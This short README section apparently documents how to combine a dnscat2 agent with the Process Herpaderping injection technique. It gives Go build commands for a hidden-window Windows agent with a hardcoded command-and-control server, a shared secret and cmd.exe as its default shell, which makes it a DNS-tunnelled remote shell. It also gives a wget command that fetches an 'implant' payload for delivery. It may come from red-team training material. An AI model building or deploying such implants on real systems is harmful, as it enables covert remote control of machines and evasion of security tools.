# Combinations

## Integrate with [Process Herpaderping](https://github.com/uetsymphonique/Advanced-Process-Injection-Workshop/blob/master/CWLHerpaderping/description.md)

Build standalone agent

See more at client's documentation (e.g. [go-client](../go-client/BUILD.md))

```bash
# only shell
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.100 \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e \
  -X main.DefaultExec=cmd.exe" \
  -o dnscat2.exe ./cmd/dnscat/

# full agent
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.100 \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e \
  -o dnscat2.exe ./cmd/dnscat/
```

Download "implant" payload

```bash
wget https://github.com/uetsymphonique/Advanced-Process-Injection-Workshop/raw/refs/heads/master/CWLHerpaderping/x64/Release/CWLHerpaderping.exe
```

Deliver tools to payload
